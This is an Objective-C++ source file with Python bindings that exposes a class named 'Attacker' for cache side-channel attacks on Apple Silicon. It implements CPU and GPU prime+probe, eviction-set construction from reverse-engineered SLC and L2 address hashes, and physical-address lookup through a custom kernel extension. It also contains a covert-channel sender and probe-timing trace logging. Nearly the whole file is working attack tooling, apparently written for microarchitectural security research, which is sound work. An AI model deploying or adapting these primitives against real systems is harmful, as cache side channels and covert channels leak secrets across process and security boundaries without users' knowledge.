// MetalHandler: implements CPU and GPU prime+probe cache side-channel primitives
// on Apple Silicon using the Metal compute API and IOKit for physical address translation.

#import <pybind11/pybind11.h>
#import <pybind11/stl.h>
#import <Metal/Metal.h>
#include <bitset>
#import <Foundation/Foundation.h>
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <time.h>
#include <mach/mach.h>
#include <mach/vm_statistics.h>
#include <mach/mach_time.h>
#include "metal-cpp/common/config.h"
#include "metal-cpp/common/memory.h"
#include "metal-cpp/common/timing.h"
#include "metal-cpp/common/cache.h"

class MetalHandler {
public:
    MetalHandler() {
        timer_start();
        device = MTLCreateSystemDefaultDevice();
        if (!device) {
            std::cerr << "Error: Metal device not available." << std::endl;
            return;
        }
        commandQueue = [device newCommandQueue];
        
        NSString *cwd = [[NSFileManager defaultManager] currentDirectoryPath];
        NSString *libPath = [cwd stringByAppendingPathComponent:@"pylib/src/default.metallib"];
        if (!libPath) {
            std::cerr << "Error: metallib not found." << std::endl;
            return;
        }
        
        NSError *error = nil;
        NSURL *libURL = [NSURL fileURLWithPath:libPath];
        metalLibrary = [device newLibraryWithURL:libURL error:&error];

        if (error) {
            std::cerr << "Error loading metallib: " << [[error localizedDescription] UTF8String] << std::endl;
            return;
        }
        
        id<MTLFunction> func_Gprime = [metalLibrary newFunctionWithName:@"GPU_prime"];
        if (!func_Gprime) {
            std::cerr << "Error: GPU_prime function not found in metallib." << std::endl;
            return;
        }
        error = nil;
        pipelineState_Gprime = [device newComputePipelineStateWithFunction:func_Gprime error:&error];
        if (error) {
            std::cerr << "Error creating pipeline state for GPU_prime: " << [[error localizedDescription] UTF8String] << std::endl;
            return;
        }

        id<MTLFunction> func_Gwrite = [metalLibrary newFunctionWithName:@"GPU_write"];
        if (!func_Gprime) {
            std::cerr << "Error: GPU_write function not found in metallib." << std::endl;
            return;
        }
        error = nil;
        pipelineState_Gprime_write = [device newComputePipelineStateWithFunction:func_Gwrite error:&error];
        if (error) {
            std::cerr << "Error creating pipeline state for GPU_write: " << [[error localizedDescription] UTF8String] << std::endl;
            return;
        }
        
        id<MTLFunction> func_read = [metalLibrary newFunctionWithName:@"read"];
        if (!func_read) {
            std::cerr << "Error: read function not found in metallib." << std::endl;
            return;
        }
        error = nil;
        pipelineState_read = [device newComputePipelineStateWithFunction:func_read error:&error];
        if (error) {
            std::cerr << "Error creating pipeline state for read: " << [[error localizedDescription] UTF8String] << std::endl;
            return;
        }
        
        target_Buffer = [device newBufferWithLength:1024*1024 options:MTLResourceStorageModeShared];
        ind_Buffer = [device newBufferWithLength:1024*1024 options:MTLResourceStorageModeShared];
        result_Buffer = [device newBufferWithLength:1024*1024 options:MTLResourceStorageModeShared];
        myfile.open("trace.txt");
        myfile2.open("Target_address.txt");
        prime_bufferSize = 1024*1024*256;
        e = (char*)std::malloc(prime_bufferSize);
        
        std::cout << "MetalHandler initialized successfully." << std::endl;
    }

    void GPU_prime() {
        int i,j,k,m;
        int size=65536;
        if (!device || !commandQueue || !pipelineState_Gprime) {
            std::cerr << "MetalHandler not properly initialized for prime." << std::endl;
            return;
        }
        if (!device || !commandQueue || !pipelineState_Gprime_write) {
            std::cerr << "MetalHandler not properly initialized for prime." << std::endl;
            return;
        }
        [Gprime_Buffer didModifyRange:NSMakeRange(0, Gprime_Buffer.length)];
        [Gprime_ind_Buffer didModifyRange:NSMakeRange(0, Gprime_ind_Buffer.length)];

        id<MTLCommandBuffer> commandBuffer = [commandQueue commandBuffer];
        id<MTLComputeCommandEncoder> encoder = [commandBuffer computeCommandEncoder];
        [encoder setComputePipelineState:pipelineState_Gprime_write];
        [encoder setBuffer:Gprime_Buffer offset:0 atIndex:0];
        [encoder setBuffer:Gprime_ind_Buffer offset:0 atIndex:1];
        [encoder setBuffer:result_Buffer offset:0 atIndex:2];
        MTLSize gridSize = MTLSizeMake(size, 1, 1);
        NSUInteger threadGroupSize = pipelineState_Gprime_write.maxTotalThreadsPerThreadgroup;
        MTLSize threadgroupSize = MTLSizeMake(threadGroupSize, 1, 1);
        [encoder dispatchThreads:gridSize threadsPerThreadgroup:threadgroupSize];
        [encoder endEncoding];
        id<MTLBlitCommandEncoder> blitEncoder = [commandBuffer blitCommandEncoder];
        [blitEncoder synchronizeResource:Gprime_Buffer];
        [blitEncoder endEncoding];
        [commandBuffer commit];
        [commandBuffer waitUntilCompleted];

        id<MTLCommandBuffer> commandBuffer2 = [commandQueue commandBuffer];
        id<MTLComputeCommandEncoder> encoder2 = [commandBuffer2 computeCommandEncoder];
        [encoder2 setComputePipelineState:pipelineState_Gprime];
        [encoder2 setBuffer:Gprime_Buffer offset:0 atIndex:0];
        [encoder2 setBuffer:Gprime_ind_Buffer offset:0 atIndex:1];
        [encoder2 setBuffer:result_Buffer offset:0 atIndex:2];
        threadGroupSize = pipelineState_Gprime.maxTotalThreadsPerThreadgroup;
        threadgroupSize = MTLSizeMake(threadGroupSize, 1, 1);
        [encoder2 dispatchThreads:gridSize threadsPerThreadgroup:threadgroupSize];
        [encoder2 endEncoding];
        id<MTLBlitCommandEncoder> blitEncoder2 = [commandBuffer2 blitCommandEncoder];
        [blitEncoder2 synchronizeResource:Gprime_Buffer];
        [blitEncoder2 endEncoding];
        [commandBuffer2 commit];
        [commandBuffer2 waitUntilCompleted];
        
    }

    void CPU_prime() {
        int evic_size=1024;
        int stride=16;
        int i,j,k,m;
        char* add;
        char* buf=(char*)e;
        for (j=0;j<(128/stride);j++){
            for (i=0;i<evic_size*stride;i++){
                if(selected_address_SLC[i*(128/stride)+j]==true){
                    add=buf+i*16384+j*128*(stride);
                    memory_access(add);
                }
                
            }
        }
        for (j=(128/stride)-1;j>=0;j--){
            for (i=evic_size*stride-1;i>=0;i--){
                if(selected_address_L2[i*(128/stride)+j]==true){
                    add=buf+i*16384+j*128*(stride);
                    memory_access(add);
                }
            }
        }
    }

    int CPU_probe(bool Gprime) {
        int i,j,k,m;
        uint64_t t;
        char* add;
        uint16_t index;
        int count=0;
        int evic_size;
        int stride;
        char* buf;
        if (Gprime==false){
            buf=(char*)e;
            evic_size=1024;
            stride=16;
        }else{
            buf=(char*)[Gprime_Buffer contents];;
            evic_size=1024;
            stride=1;
        }
        for (j=(128/stride)-1;j>=0;j--){
            for (i=evic_size*stride-1;i>=0;i--){
                if(selected_address_SLC[i*(128/stride)+j]==true){
                    add=buf+i*16384+j*(stride*128);
                    t=probe(add);
                    if(t<300 && t>160)
                    {
                        index=evic_Buffer_index[i*(128/stride)+j];

                        trace[index]++;
                        count++;
                    }
                }
                
            }
        }
        return count;
    }

    void print_out(int size, bool preset)
    {
        int i,k;
        for(k=0;k<4096;k++){
                {
                    if (preset==false){
                        myfile << (int)(trace[k]) << " ";
                    }
                    trace[k]=0;
                }
        }
        if (preset==false){
            myfile<<std::endl;
        }
    }


    void GPU_read(int start, int size) {
        int i,j,k,m;
        if (!device || !commandQueue || !pipelineState_read) {
            std::cerr << "MetalHandler not properly initialized for prime." << std::endl;
            return;
        }
        [target_Buffer didModifyRange:NSMakeRange(0, target_Buffer.length)];
        [result_Buffer didModifyRange:NSMakeRange(0, result_Buffer.length)];
        id<MTLCommandBuffer> commandBuffer = [commandQueue commandBuffer];
        id<MTLComputeCommandEncoder> encoder = [commandBuffer computeCommandEncoder];
        [encoder setComputePipelineState:pipelineState_read];
        [encoder setBuffer:target_Buffer offset:0 atIndex:0];
        [encoder setBuffer:result_Buffer offset:0 atIndex:1];
        MTLSize gridSize = MTLSizeMake(size, 1, 1);
        NSUInteger threadGroupSize = pipelineState_read.maxTotalThreadsPerThreadgroup;
        if(size<1024){
            threadGroupSize = size;
        }else{
            threadGroupSize = 1024;
        }
        
        MTLSize threadgroupSize = MTLSizeMake(threadGroupSize, 1, 1);
        [encoder dispatchThreads:gridSize threadsPerThreadgroup:threadgroupSize];
        [encoder endEncoding];

        id<MTLBlitCommandEncoder> blitEncoder = [commandBuffer blitCommandEncoder];
        [blitEncoder synchronizeResource:target_Buffer];
        [blitEncoder endEncoding];
        [commandBuffer commit];
        [commandBuffer waitUntilCompleted];
    }

void Covert_send(int message, int offsets) {
        uint32_t* ind=(uint32_t*)[Covert_Sender_ind contents];
        int count=0;
        int i,j,k,m;
        for(i=0;i<offsets;i++){
            for(j=0;j<2048;j++){
                    m=Covert_Buffer_index[j*17+i];
                    ind[count]=m*32;
                    count++;
                }
        }
        if (!device || !commandQueue || !pipelineState_Gprime) {
            std::cerr << "MetalHandler not properly initialized for prime." << std::endl;
            return;
        }
        [Covert_Sender_Buffer didModifyRange:NSMakeRange(0, Covert_Sender_Buffer.length)];
        [Covert_Sender_ind didModifyRange:NSMakeRange(0, Covert_Sender_ind.length)];
        id<MTLCommandBuffer> commandBuffer = [commandQueue commandBuffer];
        id<MTLComputeCommandEncoder> encoder = [commandBuffer computeCommandEncoder];
        [encoder setComputePipelineState:pipelineState_Gprime];
        [encoder setBuffer:Covert_Sender_Buffer offset:0 atIndex:0];
        [encoder setBuffer:Covert_Sender_ind offset:0 atIndex:1];
        [encoder setBuffer:result_Buffer offset:0 atIndex:2];
        MTLSize gridSize = MTLSizeMake(count, 1, 1);
        NSUInteger threadGroupSize = pipelineState_Gprime.maxTotalThreadsPerThreadgroup;
        threadGroupSize = 1024;
        MTLSize threadgroupSize = MTLSizeMake(threadGroupSize, 1, 1);
        [encoder dispatchThreads:gridSize threadsPerThreadgroup:threadgroupSize];
        [encoder endEncoding];

        id<MTLBlitCommandEncoder> blitEncoder = [commandBuffer blitCommandEncoder];
        [blitEncoder endEncoding];
        [commandBuffer commit];
        [commandBuffer waitUntilCompleted];
    }

int Covert_Sender_Preset()
    {
        Covert_Buffer_index = (uint32_t *)malloc(4096 * 17 * sizeof(uint32_t));
        int sending_bufferSize = 1024*1024*128;
        Covert_Sender_Buffer = [device newBufferWithLength:sending_bufferSize options:MTLResourceStorageModeShared];
        Covert_Sender_ind=[device newBufferWithLength:1024*1024 options:MTLResourceStorageModeShared];
        io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("MyKext"));
        if (service == IO_OBJECT_NULL) {
            std::cerr << "Failed to find the MyKext service" << std::endl;
            return 1;
        }

        io_connect_t connection;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
        IOObjectRelease(service);
        if (kr != KERN_SUCCESS) {
            std::cerr << "Failed to open connection to the MyKext service" << std::endl;
            return 1;
        }

        int i,j,s;
        uint64_t input;
        uint64_t PA;
        uint64_t output = 0;
        uint32_t outputCount = 1;
        uint16_t index;
        uint8_t offset;
        int count=0;
        int size=2048*4;
        void* add_buf = [Covert_Sender_Buffer contents];

        input = ((uint64_t)add_buf);
        kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);

        for(i=0;i<size;i++)
        {
            input = ((uint64_t)add_buf) + (PAGE_SIZE)*i;
            kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);
            if (kr != KERN_SUCCESS) {
                std::cerr << "Failed to call getPhysicalPageNumber" << std::endl;
                IOServiceClose(connection);
                return 1;
            }
            for (j=0;j<128;j++)
            {
                PA=output+j*128;
                index=hashFunction2(PA);
                s=Covert_Buffer_index[index*17+16];
                if(s<16)
                {
                    Covert_Buffer_index[index*17+s]=(i*128+j);
                    Covert_Buffer_index[index*17+16]++;
                    count++;
                }
            }
        }
        IOServiceClose(connection);
        return 0;
    }

int Cprime_build_evic_set()
    {
        int stride=16;
        io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("MyKext"));
        if (service == IO_OBJECT_NULL) {
            std::cerr << "Failed to find the MyKext service" << std::endl;
            return 1;
        }

        io_connect_t connection;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
        IOObjectRelease(service);
        if (kr != KERN_SUCCESS) {
            std::cerr << "Failed to open connection to the MyKext service" << std::endl;
            return 1;
        }

        int i,j,s;
        uint64_t input;
        uint64_t PA;
        uint64_t output = 0;
        uint32_t outputCount = 1;
        uint16_t index,index_l2;
        uint8_t offset;
        uint8_t slc_count[4096]={0};
        uint8_t l2_count[512]={0};
        int count=0;
        int size=1024;
        void* add_buf = (void*)e;

        input = ((uint64_t)add_buf);
        kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);


        
        {
            for(i=size*stride-1;i>=0;i--)
            {
                input = ((uint64_t)add_buf) + (PAGE_SIZE)*i;
                kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);
                if (kr != KERN_SUCCESS) {
                    std::cerr << "Failed to call getPhysicalPageNumber" << std::endl;
                    IOServiceClose(connection);
                    return 1;
                }
                for (j=(128/stride)-1;j>=0;j--)
                {
                    PA=output+(j*128*stride);
                    index=hashFunction2(PA);
                    evic_Buffer_index[i*(128/stride)+j]=index;
                    if(slc_count[index]<16){
                        selected_address_SLC[i*(128/stride)+j]=true;
                        slc_count[index]++;
                        count++;
                    }
                    else{
                        selected_address_SLC[i*(128/stride)+j]=false;
                    }
                    index_l2=hashFunction_l2(PA);
                    if(l2_count[index_l2]<12){
                        selected_address_L2[i*(128/stride)+j]=true;
                        l2_count[index_l2]++;
                    }
                    else{
                        selected_address_L2[i*(128/stride)+j]=false;
                    }
                }
            }
        }
        for (i=0;i<4096;i++){
            if(slc_count[i]<16){
                std::cout <<i <<"not enhough "<<(int)slc_count[i]<<std::endl;
            }
        }
        std::cout<<count<<std::endl;
        IOServiceClose(connection);
        return 0;
    }

int Gprime_build_evic_set()
    {
        prime_bufferSize = 1024*1024*16;
        Gprime_Buffer = [device newBufferWithLength:prime_bufferSize options:MTLResourceStorageModeShared];
        Gprime_ind_Buffer = [device newBufferWithLength:1024*1024 options:MTLResourceStorageModeShared];
        io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("MyKext"));
        if (service == IO_OBJECT_NULL) {
            std::cerr << "Failed to find the MyKext service" << std::endl;
            return 1;
        }

        io_connect_t connection;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
        IOObjectRelease(service);
        if (kr != KERN_SUCCESS) {
            std::cerr << "Failed to open connection to the MyKext service" << std::endl;
            return 1;
        }

        int i,j,s;
        uint64_t input;
        uint64_t PA;
        uint64_t output = 0;
        uint32_t outputCount = 1;
        uint16_t index;
        uint8_t offset;
        int count=0;
        int size=1024;
        void* add_buf = [Gprime_Buffer contents];
        uint32_t* ind=(uint32_t*)[Gprime_ind_Buffer contents];
        uint8_t slc_count[4096]={0};

        input = ((uint64_t)add_buf);
        kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);

        for(i=0;i<size;i++)
        {
            {
                input = ((uint64_t)add_buf) + (PAGE_SIZE)*i;
                kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);
                if (kr != KERN_SUCCESS) {
                    std::cerr << "Failed to call getPhysicalPageNumber" << std::endl;
                    IOServiceClose(connection);
                    return 1;
                }
                for (j=0;j<128;j++)
                {
                    PA=output+j*128;
                    index=hashFunction2(PA);
                    evic_Buffer_index[i*128+j]=index;
                    if(slc_count[index]<16)
                    {
                        ind[count]=(i*128+j)*32;
                        selected_address_SLC[i*128+j]=true;
                        count++;
                        slc_count[index]++;
                    }
                    else{
                        selected_address_SLC[i*128+j]=false;
                    }
                }
            }
        }
        IOServiceClose(connection);
        return count;
    }


int get_physical_target_address()
    {

        io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("MyKext"));
        if (service == IO_OBJECT_NULL) {
            std::cerr << "Failed to find the MyKext service" << std::endl;
            return 1;
        }

        io_connect_t connection;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
        IOObjectRelease(service);
        if (kr != KERN_SUCCESS) {
            std::cerr << "Failed to open connection to the MyKext service" << std::endl;
            return 1;
        }

        int i,j,s;
        uint64_t input;
        uint64_t PA;
        uint64_t output = 0;
        uint32_t outputCount = 1;
        uint16_t index;
        uint8_t offset;
        int count=0;
        int size=0;
        void* add_buf = [target_Buffer contents];

        uint32_t* ind=(uint32_t*)[ind_Buffer contents];

        input = ((uint64_t)add_buf);
        kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);

        for(i=0;i<size;i++)
        {
            input = ((uint64_t)add_buf) + (PAGE_SIZE)*i;
            kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);
            if (kr != KERN_SUCCESS) {
                std::cerr << "Failed to call getPhysicalPageNumber" << std::endl;
                IOServiceClose(connection);
                return 1;
            }
            for (j=0;j<128;j++)
            {
                PA=output+j*128;
                index=hashFunction2(PA);
                if(index==100){
                    ind[count]=(i*128+j)*32;
                    count++;
                }
            }
        }
        std::cout<<count<<std::endl;

        add_buf = (void*)[target_Buffer contents];
        input = ((uint64_t)add_buf);
        kr = IOConnectCallScalarMethod(connection, 0, &input, 1, &output, &outputCount);
        for (i=0;i<128;i++){
            PA=output+i*128;
            index=hashFunction2(PA);
            myfile2 << index << std::endl;
        }
        IOServiceClose(connection);
        return 0;
    }

    // Compute the L2 cache set index from a physical address using known bit XOR masks
    uint16_t hashFunction_l2(uint64_t A){
        int i,j;
        uint16_t add[33]={0};
        uint16_t index=0;
        for (i=0;i<33;i++){
            add[i]=(A>>i) & 1;
        }
        uint16_t ind[9]={0};
        for (i=0;i<3;i++){
            ind[i]=add[i+11];
        }
        for (i=0;i<4;i++){
            ind[i+3]=add[i+16];
        }
        ind[7]=add[14]^add[22]^add[24]^add[26]^add[27]^add[29]^add[31];
        ind[8]=add[15]^add[20]^add[21]^add[23]^add[25]^add[28]^add[30]^add[32];
        for (i=0;i<9;i++){
            index+=ind[i]<<i;
        }
        return index;
    }



    // Compute the SLC (System Level Cache) set index from a physical address.
    // Uses two sets of XOR bit masks derived from reverse-engineered Apple Silicon address hashing.
    uint16_t hashFunction2(uint64_t A) {
        const uint32_t masks[] = {
            0x1A06, 0x69F8, 0x18121, 0x20083, 0x4A6EC, 0x806A3
        };
        const uint32_t masks2[] = {
            0x855, 0xA5b0, 0x2ad2, 0x6e9, 0x2286,0xA351
        };
        uint32_t segment = (A >> 13) & 0xFFFFF;  // Extract bits 14-33
        uint32_t segment2 = (A >> 7) & 0x3F;  
        uint16_t result = 0;

        for (int i = 0; i < 6; ++i) {
            uint32_t mask = masks[i];
            uint8_t bitResult = 0;
            for (int j = 0; j < 20; ++j) {
                if (mask & (1 << j)) {
                    bitResult ^= (segment >> j) & 1;  // XOR bits as per mask
                }
            }
            result |= (bitResult << (i+6));  // Set bit in result
        }
        for (int i = 0; i < 6; ++i) {
            uint32_t mask = masks2[i];
            uint8_t bitResult = 0;
            for (int j = 0; j < 20; ++j) {
                if (mask & (1 << j)) {
                    bitResult ^= (segment >> j) & 1;  // XOR bits as per mask
                }
            }
            bitResult ^=(segment2 >> i) & 1;
            result |= (bitResult << i);  // Set bit in result
        }

        return result;
    }


    
    ~MetalHandler() {
        get_physical_target_address();
        timer_stop();
        myfile.close();
        myfile2.close();
        myfile2.close();
        [result_Buffer release];
        [ind_Buffer release];
        [target_Buffer release];
        [Gprime_Buffer release];
        [pipelineState_read release];
        [pipelineState_Gprime release];
        [pipelineState_Gprime_write release];

        [metalLibrary release];
        [commandQueue release];
        [device release];
    }


    
    
private:
    id<MTLDevice> device = nil;
    id<MTLCommandQueue> commandQueue = nil;
    id<MTLLibrary> metalLibrary = nil;
    id<MTLComputePipelineState> pipelineState_Gprime = nil;
    id<MTLComputePipelineState> pipelineState_Gprime_write = nil;
    id<MTLComputePipelineState> pipelineState_read = nil;
    
    id<MTLBuffer> Gprime_Buffer = nil;
    id<MTLBuffer> Gprime_ind_Buffer = nil;
    id<MTLBuffer> Covert_Sender_Buffer = nil;
    id<MTLBuffer> Covert_Sender_ind = nil;
    id<MTLBuffer> target_Buffer = nil;
    id<MTLBuffer> ind_Buffer = nil;
    id<MTLBuffer> result_Buffer = nil;
    uint16_t evic_Buffer_index[262144]={0};
    std::bitset<262144> selected_address_SLC;
    std::bitset<262144> selected_address_probe;
    std::bitset<262144> selected_address_L2;
    uint32_t *Covert_Buffer_index;
    uint16_t trace[4096]={0};
    char* e;
    NSUInteger prime_bufferSize = 0;

    std::ofstream myfile;
    std::ofstream myfile2;
};

// Factory function to create a MetalHandler instance
extern "C" MetalHandler* create_metal_handler() {
    return new MetalHandler();
}

// Python bindings via pybind11
namespace py = pybind11;

PYBIND11_MODULE(mymodule, m) {
    m.doc() = "Python bindings for GPU/CPU cache side-channel primitives using Apple Metal.";
    
    py::class_<MetalHandler>(m, "Attacker")
        .def(py::init([]() { return std::unique_ptr<MetalHandler>(create_metal_handler()); }))
        .def("Cprime", &MetalHandler::CPU_prime, "Execute prime on CPU")
        .def("Gprime", &MetalHandler::GPU_prime, "Execute prime on GPU using Metal")
        .def("probe", &MetalHandler::CPU_probe, "Execute probe on GPU using Metal")
        .def("gpu_read", &MetalHandler::GPU_read, "target")
        .def("print", &MetalHandler::print_out, "print traces")
        .def("Cprime_build_evic_set", &MetalHandler::Cprime_build_evic_set, "build eviction set for Cprime")
        .def("Gprime_build_evic_set", &MetalHandler::Gprime_build_evic_set, "build eviction set for Gprime")
        .def("Covert_Sender_Preset", &MetalHandler::Covert_Sender_Preset, "Preset sender")
        .def("Covert_send", &MetalHandler::Covert_send, "Covert send");
}
